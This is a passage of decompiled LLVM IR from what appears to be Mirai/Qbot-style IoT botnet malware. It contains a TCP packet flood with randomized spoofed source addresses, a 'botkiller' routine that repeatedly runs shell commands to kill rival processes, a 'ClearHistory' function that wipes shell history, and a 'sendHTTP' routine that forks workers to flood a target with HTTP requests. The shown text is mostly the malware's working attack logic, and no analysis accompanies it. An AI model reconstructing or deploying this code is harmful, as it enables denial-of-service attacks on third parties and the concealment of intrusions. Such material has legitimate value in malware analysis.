  %v4_fe84 = call i32 @__GI_strcoll(i8* %v3_fe24, i32 ptrtoint ([4 x i8]* @global_var_1c070.573 to i32))
  store i32 %v4_fe84, i32* %r3.global-to-local, align 4
  %v2_fe8c = icmp eq i32 %v4_fe84, 0
  br i1 %v2_fe8c, label %dec_label_pc_fe94, label %dec_label_pc_fea8

dec_label_pc_fe94:                                ; preds = %dec_label_pc_fe78
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v3_fe98 = load i8, i8* %v2_fe38, align 1
  %v4_fe98 = zext i8 %v3_fe98 to i32
  %v1_fe9c = or i32 %v4_fe98, 1
  store i32 %v1_fe9c, i32* %r3.global-to-local, align 4
  %v1_fea0 = trunc i32 %v1_fe9c to i8
  store i8 %v1_fea0, i8* %v2_fe38, align 1
  br label %dec_label_pc_ff20

dec_label_pc_fea8:                                ; preds = %dec_label_pc_fe78
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c074.575 to i32), i32* @r1, align 4
  %v4_feb4 = call i32 @__GI_strcoll(i8* %v3_fe24, i32 ptrtoint ([4 x i8]* @global_var_1c074.575 to i32))
  store i32 %v4_feb4, i32* %r3.global-to-local, align 4
  %v2_febc = icmp eq i32 %v4_feb4, 0
  br i1 %v2_febc, label %dec_label_pc_fec4, label %dec_label_pc_fed8

dec_label_pc_fec4:                                ; preds = %dec_label_pc_fea8
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v3_fec8 = load i8, i8* %v2_fe38, align 1
  %v4_fec8 = zext i8 %v3_fec8 to i32
  %v1_fecc = or i32 %v4_fec8, 16
  store i32 %v1_fecc, i32* %r3.global-to-local, align 4
  %v1_fed0 = trunc i32 %v1_fecc to i8
  store i8 %v1_fed0, i8* %v2_fe38, align 1
  br label %dec_label_pc_ff20

dec_label_pc_fed8:                                ; preds = %dec_label_pc_fea8
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c078.577 to i32), i32* @r1, align 4
  %v4_fee4 = call i32 @__GI_strcoll(i8* %v3_fe24, i32 ptrtoint ([4 x i8]* @global_var_1c078.577 to i32))
  store i32 %v4_fee4, i32* %r3.global-to-local, align 4
  %v2_feec = icmp eq i32 %v4_fee4, 0
  br i1 %v2_feec, label %dec_label_pc_fef4, label %dec_label_pc_ff08

dec_label_pc_fef4:                                ; preds = %dec_label_pc_fed8
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v3_fef8 = load i8, i8* %v2_fe38, align 1
  %v4_fef8 = zext i8 %v3_fef8 to i32
  %v1_fefc = or i32 %v4_fef8, 8
  store i32 %v1_fefc, i32* %r3.global-to-local, align 4
  %v1_ff00 = trunc i32 %v1_fefc to i8
  store i8 %v1_ff00, i8* %v2_fe38, align 1
  br label %dec_label_pc_ff20

dec_label_pc_ff08:                                ; preds = %dec_label_pc_fed8
  %v2_ff0c = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_ff0c, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_ff1c = call i32 @sockprintf(i32 %v2_ff0c, i32 ptrtoint ([18 x i8]* @global_var_1c07c.579 to i32))
  br label %dec_label_pc_ff20

dec_label_pc_ff20:                                ; preds = %dec_label_pc_fef4, %dec_label_pc_fec4, %dec_label_pc_fe94, %dec_label_pc_fe64, %dec_label_pc_fe34, %dec_label_pc_ff08
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_ff28 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  store i32 %v2_ff28, i32* %r3.global-to-local, align 4
  %v2_ff38 = icmp eq i32 %v2_ff28, 0
  br i1 %v2_ff38, label %dec_label_pc_ff40, label %dec_label_pc_fe18

dec_label_pc_ff40:                                ; preds = %dec_label_pc_ff20, %dec_label_pc_fdfc, %dec_label_pc_fda8
  %v0_ff40 = call i32 @rand_cmwc()
  %v3_ff4c = urem i32 %v0_ff40, 65536
  store i32 %v3_ff4c, i32* %r3.global-to-local, align 4
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v1_ff54 = trunc i32 %v0_ff40 to i8
  %v3_ff54 = add i32 %v3_fccc, 34
  %v4_ff54 = inttoptr i32 %v3_ff54 to i8*
  store i8 %v1_ff54, i8* %v4_ff54, align 2
  %v0_ff58 = load i32, i32* %r3.global-to-local, align 4
  %v3_ff5825 = udiv i32 %v0_ff58, 256
  %v1_ff5c = trunc i32 %v3_ff5825 to i8
  %v2_ff5c = load i32, i32* %r2.global-to-local, align 4
  %v3_ff5c = add i32 %v2_ff5c, 15
  %v4_ff5c = inttoptr i32 %v3_ff5c to i8*
  store i8 %v1_ff5c, i8* %v4_ff5c, align 1
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ff68 = add i32 %v3_fccc, 36
  %v4_ff68 = inttoptr i32 %v3_ff68 to i8*
  store i8 0, i8* %v4_ff68, align 4
  %v0_ff6c = load i32, i32* %r3.global-to-local, align 4
  %v1_ff6c = trunc i32 %v0_ff6c to i8
  %v2_ff6c = load i32, i32* %r2.global-to-local, align 4
  %v3_ff6c = add i32 %v2_ff6c, 17
  %v4_ff6c = inttoptr i32 %v3_ff6c to i8*
  store i8 %v1_ff6c, i8* %v4_ff6c, align 1
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ff78 = add i32 %v3_fccc, 38
  %v4_ff78 = inttoptr i32 %v3_ff78 to i8*
  store i8 0, i8* %v4_ff78, align 2
  %v0_ff7c = load i32, i32* %r3.global-to-local, align 4
  %v1_ff7c = trunc i32 %v0_ff7c to i8
  %v2_ff7c = load i32, i32* %r2.global-to-local, align 4
  %v3_ff7c = add i32 %v2_ff7c, 19
  %v4_ff7c = inttoptr i32 %v3_ff7c to i8*
  store i8 %v1_ff7c, i8* %v4_ff7c, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_fb58, label %dec_label_pc_ff8c, label %dec_label_pc_ffa4

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff40
  %v0_ff8c = call i32 @rand_cmwc()
  %v3_ff94 = mul i32 %v0_ff8c, 65536
  store i32 %v3_ff94, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_ff8c to i8
  br label %dec_label_pc_ffc0

dec_label_pc_ffa4:                                ; preds = %dec_label_pc_ff40
  %v3_ffac = urem i32 %arg2, 65536
  store i32 %v3_ffac, i32* %r3.global-to-local, align 4
  %v1_ffb4 = call i32 @htons(i32 %v3_ffac)
  %extract.t71 = trunc i32 %v1_ffb4 to i8
  br label %dec_label_pc_ffc0

dec_label_pc_ffc0:                                ; preds = %dec_label_pc_ff8c, %dec_label_pc_ffa4
  %v0_ff8c.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_ff8c ], [ %extract.t71, %dec_label_pc_ffa4 ]
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v4_ffc4 = sext i8 %v0_ff8c.sink.off0 to i32
  %v3_ffc8 = add i32 %v3_fccc, 22
  %v4_ffc8 = inttoptr i32 %v3_ffc8 to i8*
  store i8 %v0_ff8c.sink.off0, i8* %v4_ffc8, align 2
  %v3_ffd0 = sdiv i32 %v4_ffc4, 256
  %v4_ffd0 = trunc i32 %v3_ffd0 to i8
  store i32 %v3_ffd0, i32* %r3.global-to-local, align 4
  %v4_ffd4 = add i32 %v3_fccc, 23
  %v5_ffd4 = inttoptr i32 %v4_ffd4 to i8*
  store i8 %v4_ffd0, i8* %v5_ffd4, align 1
  %v5_ffe0 = call i32 @tcpcsum(i32 %v3_fccc, i32 %v1_fcec, i32 %v1_fcec, i32 %v3_ffd0)
  %sext = mul i32 %v5_ffe0, 16777216
  %v1_ffe4 = sdiv i32 %sext, 16777216
  store i32 %v1_ffe4, i32* %r3.global-to-local, align 4
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v1_ffec = trunc i32 %v1_ffe4 to i8
  store i8 %v1_ffec, i8* %v4_ff68, align 4
  %v0_fff0 = load i32, i32* %r3.global-to-local, align 4
  %v3_fff028 = udiv i32 %v0_fff0, 256
  %v1_fff4 = trunc i32 %v3_fff028 to i8
  %v2_fff4 = load i32, i32* %r2.global-to-local, align 4
  %v3_fff4 = add i32 %v2_fff4, 17
  %v4_fff4 = inttoptr i32 %v3_fff4 to i8*
  store i8 %v1_fff4, i8* %v4_fff4, align 1
  %v1_10004 = or i32 %v3_fccc, 2
  store i32 %v1_10004, i32* %r3.global-to-local, align 4
  %v1_10008 = inttoptr i32 %v1_10004 to i8*
  %v2_10008 = load i8, i8* %v1_10008, align 2
  %v3_10008 = zext i8 %v2_10008 to i32
  store i32 %v3_10008, i32* %r2.global-to-local, align 4
  %v1_1000c = or i32 %v1_fcc8, 3
  %v2_1000c = inttoptr i32 %v1_1000c to i8*
  %v3_1000c = load i8, i8* %v2_1000c, align 1
  %v4_1000c = zext i8 %v3_1000c to i32
  %v4_10010 = mul nuw nsw i32 %v4_1000c, 256
  %v5_10010 = or i32 %v4_10010, %v3_10008
  store i32 %v5_10010, i32* %r3.global-to-local, align 4
  %v3_1001c = call i32 @csum(i8* %v4_fd28, i32 %v5_10010)
  %sext4 = mul i32 %v3_1001c, 16777216
  %v1_10020 = sdiv i32 %sext4, 16777216
  store i32 %v1_10020, i32* %r3.global-to-local, align 4
  store i32 %v3_fccc, i32* %r2.global-to-local, align 4
  %v1_10028 = trunc i32 %v1_10020 to i8
  %v3_10028 = add i32 %v3_fccc, 10
  %v4_10028 = inttoptr i32 %v3_10028 to i8*
  store i8 %v1_10028, i8* %v4_10028, align 2
  %v0_1002c = load i32, i32* %r3.global-to-local, align 4
  %v3_1002c = sdiv i32 %v0_1002c, 256
  store i32 %v3_1002c, i32* %r3.global-to-local, align 4
  %v1_10030 = trunc i32 %v3_1002c to i8
  %v2_10030 = load i32, i32* %r2.global-to-local, align 4
  %v3_10030 = add i32 %v2_10030, 11
  %v4_10030 = inttoptr i32 %v3_10030 to i8*
  store i8 %v1_10030, i8* %v4_10030, align 1
  %v2_10038 = call i32 @__GI_time(i32* null)
  %v2_10044 = add i32 %v2_10038, %arg3
  store i32 %v2_10044, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1009c = add i32 %v3_fccc, 12
  %v3_1009c = inttoptr i32 %v2_1009c to i32*
  %v3_100b4 = add i32 %v3_fccc, 4
  %v4_100b4 = inttoptr i32 %v3_100b4 to i8*
  %v4_100fc = add i32 %v3_fccc, 37
  %v5_100fc = inttoptr i32 %v4_100fc to i8*
  br label %dec_label_pc_10058

dec_label_pc_10058:                               ; preds = %dec_label_pc_10190, %dec_label_pc_10184, %dec_label_pc_ffc0
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_ffc0 ], [ 0, %dec_label_pc_10184 ], [ %v1_10194, %dec_label_pc_10190 ]
  store i32 %v3_fccc, i32* %r2.global-to-local, align 4
  %v1_10060 = load i32, i32* @sp, align 4
  %v2_10060 = inttoptr i32 %v1_10060 to i32*
  store i32 %v2_fbc8, i32* %v2_10060, align 4
  %v1_10068 = load i32, i32* @sp, align 4
  %v2_10068 = add i32 %v1_10068, 4
  %v3_10068 = inttoptr i32 %v2_10068 to i32*
  store i32 16, i32* %v3_10068, align 4
  %v0_10070 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_fc9c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_1007c = inttoptr i32 %v0_10070 to i32*
  %v7_1007c = call i32 @__libc_sendto(i32 %v0_fbec, i32* %v6_1007c, i32 %v1_fc9c, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10084 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_10084, i32* %r3.global-to-local, align 4
  %v1_10090 = call i32 @htonl(i32 %v1_10084)
  store i32 %v1_10090, i32* %r2.global-to-local, align 4
  store i32 %v3_fccc, i32* %r3.global-to-local, align 4
  store i32 %v1_10090, i32* %v3_1009c, align 4
  %v0_100a0 = call i32 @rand_cmwc()
  %v3_100ac = urem i32 %v0_100a0, 65536
  store i32 %v3_100ac, i32* %r3.global-to-local, align 4
  store i32 %v3_fccc, i32* %r2.global-to-local, align 4
  %v1_100b4 = trunc i32 %v0_100a0 to i8
  store i8 %v1_100b4, i8* %v4_100b4, align 4
  %v0_100b8 = load i32, i32* %r3.global-to-local, align 4
  %v3_100b8 = sdiv i32 %v0_100b8, 256
  store i32 %v3_100b8, i32* %r3.global-to-local, align 4
  %v1_100bc = trunc i32 %v3_100b8 to i8
  %v2_100bc = load i32, i32* %r2.global-to-local, align 4
  %v3_100bc = add i32 %v2_100bc, 5
  %v4_100bc = inttoptr i32 %v3_100bc to i8*
  store i8 %v1_100bc, i8* %v4_100bc, align 1
  %v0_100c0 = call i32 @rand_cmwc()
  store i32 %v0_100c0, i32* %r2.global-to-local, align 4
  store i32 %v1_fcec, i32* %r3.global-to-local, align 4
  store i32 %v0_100c0, i32* %v3_fd58, align 4
  %v0_100d0 = call i32 @rand_cmwc()
  %v3_100dc = urem i32 %v0_100d0, 65536
  store i32 %v3_100dc, i32* %r3.global-to-local, align 4
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v1_100e4 = trunc i32 %v0_100d0 to i8
  store i8 %v1_100e4, i8* %v5_fcf0, align 4
  %v0_100e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_100e829 = udiv i32 %v0_100e8, 256
  %v1_100ec = trunc i32 %v3_100e829 to i8
  %v2_100ec = load i32, i32* %r2.global-to-local, align 4
  %v3_100ec = add i32 %v2_100ec, 1
  %v4_100ec = inttoptr i32 %v3_100ec to i8*
  store i8 %v1_100ec, i8* %v4_100ec, align 1
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_ff68, align 4
  store i8 0, i8* %v5_100fc, align 1
  %v5_10108 = call i32 @tcpcsum(i32 %v3_fccc, i32 %v1_fcec, i32 %v1_fcec, i32 0)
  %sext5 = mul i32 %v5_10108, 16777216
  %v1_1010c = sdiv i32 %sext5, 16777216
  store i32 %v1_1010c, i32* %r3.global-to-local, align 4
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v1_10114 = trunc i32 %v1_1010c to i8
  store i8 %v1_10114, i8* %v4_ff68, align 4
  %v0_10118 = load i32, i32* %r3.global-to-local, align 4
  %v3_1011830 = udiv i32 %v0_10118, 256
  %v1_1011c = trunc i32 %v3_1011830 to i8
  %v2_1011c = load i32, i32* %r2.global-to-local, align 4
  %v3_1011c = add i32 %v2_1011c, 17
  %v4_1011c = inttoptr i32 %v3_1011c to i8*
  store i8 %v1_1011c, i8* %v4_1011c, align 1
  store i32 %v1_10004, i32* %r3.global-to-local, align 4
  %v2_10130 = load i8, i8* %v1_10008, align 2
  %v3_10130 = zext i8 %v2_10130 to i32
  store i32 %v3_10130, i32* %r2.global-to-local, align 4
  %v3_10134 = load i8, i8* %v2_1000c, align 1
  %v4_10134 = zext i8 %v3_10134 to i32
  %v4_10138 = mul nuw nsw i32 %v4_10134, 256
  %v5_10138 = or i32 %v4_10138, %v3_10130
  store i32 %v5_10138, i32* %r3.global-to-local, align 4
  %v3_10144 = call i32 @csum(i8* %v4_fd28, i32 %v5_10138)
  %sext6 = mul i32 %v3_10144, 16777216
  %v1_10148 = sdiv i32 %sext6, 16777216
  store i32 %v1_10148, i32* %r3.global-to-local, align 4
  store i32 %v3_fccc, i32* %r2.global-to-local, align 4
  %v1_10150 = trunc i32 %v1_10148 to i8
  store i8 %v1_10150, i8* %v4_10028, align 2
  %v0_10154 = load i32, i32* %r3.global-to-local, align 4
  %v3_1015431 = udiv i32 %v0_10154, 256
  %v1_10158 = trunc i32 %v3_1015431 to i8
  %v2_10158 = load i32, i32* %r2.global-to-local, align 4
  %v3_10158 = add i32 %v2_10158, 11
  %v4_10158 = inttoptr i32 %v3_10158 to i8*
  store i8 %v1_10158, i8* %v4_10158, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_10164 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_10164, label %dec_label_pc_1016c, label %dec_label_pc_10190

dec_label_pc_1016c:                               ; preds = %dec_label_pc_10058
  %v2_10170 = call i32 @__GI_time(i32* null)
  store i32 %v2_10170, i32* %r2.global-to-local, align 4
  store i32 %v2_10044, i32* %r3.global-to-local, align 4
  %v8_10180 = icmp sgt i32 %v2_10170, %v2_10044
  br i1 %v8_10180, label %dec_label_pc_101a0, label %dec_label_pc_10184

dec_label_pc_10184:                               ; preds = %dec_label_pc_1016c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10058

dec_label_pc_10190:                               ; preds = %dec_label_pc_10058
  %v1_10194 = add i32 %stack_var_-88.0, 1
  store i32 %v1_10194, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10058

dec_label_pc_101a0:                               ; preds = %dec_label_pc_1016c, %dec_label_pc_fba4, %dec_label_pc_fc50, %dec_label_pc_fc04
  %v12_101a8 = phi i32 [ %v3_fbb4, %dec_label_pc_fba4 ], [ %v3_fc60, %dec_label_pc_fc50 ], [ %v3_fc14, %dec_label_pc_fc04 ], [ %v2_10170, %dec_label_pc_1016c ]
  store i32 %v3_fb18, i32* @r4, align 4
  store i32 %v6_fb18, i32* @fp, align 4
  ret i32 %v12_101a8

; uselistorder directives
  uselistorder i32 %v1_10194, { 1, 0 }
  uselistorder i32 %v1_10148, { 1, 0 }
  uselistorder i32 %v1_1010c, { 1, 0 }
  uselistorder i32 %v0_100d0, { 1, 0 }
  uselistorder i32 %v3_100b8, { 1, 0 }
  uselistorder i32 %v0_100a0, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_10044, { 1, 0, 2 }
  uselistorder i32 %v3_1002c, { 1, 0 }
  uselistorder i32 %v1_10020, { 1, 0 }
  uselistorder i32 %v1_10004, { 0, 2, 1 }
  uselistorder i32 %v1_ffe4, { 1, 0 }
  uselistorder i32 %v3_ffd0, { 2, 0, 1 }
  uselistorder i8 %v0_ff8c.sink.off0, { 1, 0 }
  uselistorder i32 %v3_ffac, { 1, 0 }
  uselistorder i32 %v0_ff8c, { 1, 0 }
  uselistorder i32 %v0_ff40, { 1, 0 }
  uselistorder i32 %v2_ff28, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_fe38, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_fdac, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_fd44, { 1, 0 }
  uselistorder i32 %v0_fd2c, { 1, 0 }
  uselistorder i32 %v1_fcec, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_fccc, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_fc9c, { 1, 0 }
  uselistorder i32 %v3_fb88, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 11, 12, 8, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23, 27, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 54, 38, 39, 41, 40, 42, 44, 43, 45, 47, 46, 48, 50, 49, 51, 53, 52, 83, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 69, 68, 70, 71, 72, 74, 73, 75, 76, 77, 79, 78, 80, 81, 82, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_101a0, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ffc0, { 1, 0 }
  uselistorder label %dec_label_pc_ff20, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_fe18, { 1, 0 }
  uselistorder label %dec_label_pc_fc98, { 1, 0 }
  uselistorder label %dec_label_pc_fba4, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %v2_101e4 = ptrtoint i8** %stack_var_-100 to i32
  %v2_10230 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_101e8

dec_label_pc_101e8:                               ; preds = %dec_label_pc_102c0, %entry
  br label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %dec_label_pc_101e8, %dec_label_pc_101f4
  %storemerge45 = phi i32 [ 0, %dec_label_pc_101e8 ], [ %v1_102ac, %dec_label_pc_101f4 ]
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v4_10220 = mul nuw nsw i32 %storemerge45, 4
  %v5_10220 = add i32 %v4_10220, ptrtoint ([87 x i8*]* @global_var_26024.668 to i32)
  %v6_10220 = inttoptr i32 %v5_10220 to i32*
  %v7_10220 = load i32, i32* %v6_10220, align 4
  store i32 %v7_10220, i32* @r1, align 4
  %v3_10230 = call i32 @strcat(i8* %v2_10230, i32 %v7_10220)
  %v1_1023c = call i32 @__libc_system(i32 %v2_101e4)
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v7_10278 = load i32, i32* %v6_10220, align 4
  store i32 %v7_10278, i32* @r1, align 4
  %v3_10288 = call i32 @strcat(i8* %v2_10230, i32 %v7_10278)
  store i32 ptrtoint (i32* @global_var_1c0a8.674 to i32), i32* @r1, align 4
  %v3_10298 = call i32 @strcat(i8* %v2_10230, i32 ptrtoint (i32* @global_var_1c0a8.674 to i32))
  %v1_102a4 = call i32 @__libc_system(i32 %v2_101e4)
  %v1_102ac = add nuw nsw i32 %storemerge45, 1
  %v7_102bc = icmp slt i32 %v1_102ac, 9
  br i1 %v7_102bc, label %dec_label_pc_101f4, label %dec_label_pc_102c0

dec_label_pc_102c0:                               ; preds = %dec_label_pc_101f4
  %v1_102c4 = call i32 @sleep(i32 5)
  br label %dec_label_pc_101e8

; uselistorder directives
  uselistorder i32 %storemerge45, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 57, { 1, 0 }
  uselistorder i32 54, { 1, 0 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 50, { 0, 2, 1 }
  uselistorder i32 49, { 0, 1, 3, 2 }
  uselistorder [3 x i8]* @global_var_1aa08.41, { 1, 0 }
  uselistorder label %dec_label_pc_101f4, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_102ec = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_1c0ac.676 to i32))
  %v2_102f4 = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_1c0c4.678 to i32))
  %v2_102fc = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_1c0e4.680 to i32))
  ret i32 %v2_102fc

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 4, 3, 2, 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-584 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_10314 = load i32, i32* @r4, align 4
  store i32 %v3_10314, i32* %stack_var_-20, align 4
  %v6_10314 = load i32, i32* @fp, align 4
  store i32 66332, i32* %stack_var_-4, align 4
  %v16_10314 = ptrtoint i32* %stack_var_-20 to i32
  %v2_10318 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10318, i32* @fp, align 4
  %v2_10368 = call i32 @__GI_time(i32* null)
  %v3_10370 = load i32, i32* %stack_var_0, align 4
  %v2_10374 = add i32 %v3_10370, %v2_10368
  %v0_1037c = call i32 @random()
  %v2_1038c = srem i32 %v0_1037c, 3
  %v3_10398 = mul nsw i32 %v2_1038c, 4
  %v2_103a0 = add i32 %v16_10314, -52
  %v2_103a4 = add i32 %v2_103a0, %v3_10398
  %v1_103a8 = inttoptr i32 %v2_103a4 to i32*
  %v2_103a8 = load i32, i32* %v1_103a8, align 4
  store i32 %v2_103a8, i32* @r4, align 4
  %v0_103ac = call i32 @random()
  %v2_103bc = srem i32 %v0_103ac, 7
  %v3_103c8 = mul nsw i32 %v2_103bc, 4
  %v2_103d0 = add i32 %v16_10314, -40
  %v2_103d4 = add i32 %v2_103d0, %v3_103c8
  %v1_103d8 = inttoptr i32 %v2_103d4 to i32*
  %v2_103d8 = load i32, i32* %v1_103d8, align 4
  %v2_103dc = ptrtoint i32* %stack_var_-584 to i32
  %v0_103e0 = load i32, i32* @r4, align 4
  store i32 %v2_103dc, i32* @r0, align 4
  %v7_103f8 = call i32 @sprintf(i32 %v2_103dc, i32 ptrtoint ([62 x i8]* @global_var_1c318.704 to i32), i32 %arg2, i32 %arg4, i32 %v0_103e0, i32 %v2_103d8)
  br label %dec_label_pc_104a4

dec_label_pc_10408:                               ; preds = %dec_label_pc_104a4
  %v0_10408 = call i32 @__libc_fork()
  %v2_10410 = icmp eq i32 %v0_10408, 0
  %v1_1049c = add nuw i32 %storemerge2, 1
  br i1 %v2_10410, label %dec_label_pc_104a4, label %dec_label_pc_10478.preheader

dec_label_pc_10478.preheader:                     ; preds = %dec_label_pc_10408
  %tmp33 = bitcast i32* %stack_var_-584 to i8*
  br label %dec_label_pc_10478

dec_label_pc_1041c:                               ; preds = %dec_label_pc_10478
  %v5_10438 = call i32 @socket_connect(i32 %arg1, i8 %arg3, i32 %tmp)
  %v2_10448 = icmp eq i32 %v5_10438, 0
  br i1 %v2_10448, label %dec_label_pc_10478, label %dec_label_pc_10450

dec_label_pc_10450:                               ; preds = %dec_label_pc_1041c
  %v3_10458 = call i32 @strlen(i8* %tmp33)
  store i32 %v3_10458, i32* @r2, align 4
  %v3_1046c = call i32 @__libc_write(i32 %v5_10438, i32* nonnull %stack_var_-584)
  %v1_10474 = call i32 @__libc_close(i32 %v5_10438)
  br label %dec_label_pc_10478

dec_label_pc_10478:                               ; preds = %dec_label_pc_1041c, %dec_label_pc_10450, %dec_label_pc_10478.preheader
  %v2_1047c = call i32 @__GI_time(i32* null)
  %v5_1048c = icmp slt i32 %v2_1047c, %v2_10374
  br i1 %v5_1048c, label %dec_label_pc_1041c, label %dec_label_pc_10490

dec_label_pc_10490:                               ; preds = %dec_label_pc_10478
  %v1_10494 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_104a4:                               ; preds = %dec_label_pc_10408, %entry
  %v12_104b8 = phi i32 [ %v7_103f8, %entry ], [ 0, %dec_label_pc_10408 ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_1049c, %dec_label_pc_10408 ]
  %v5_104b0 = icmp slt i32 %storemerge2, %arg6
  br i1 %v5_104b0, label %dec_label_pc_10408, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %dec_label_pc_104a4
  %v2_104b8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_104b8, i32* @r4, align 4
  store i32 %v6_10314, i32* @fp, align 4
  ret i32 %v12_104b8

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %v5_10438, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_10478, { 1, 0, 2 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_104c8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_104c8, i32* @ip, align 4
  %v3_104cc = load i32, i32* @r4, align 4
  %v6_104cc = load i32, i32* @r5, align 4
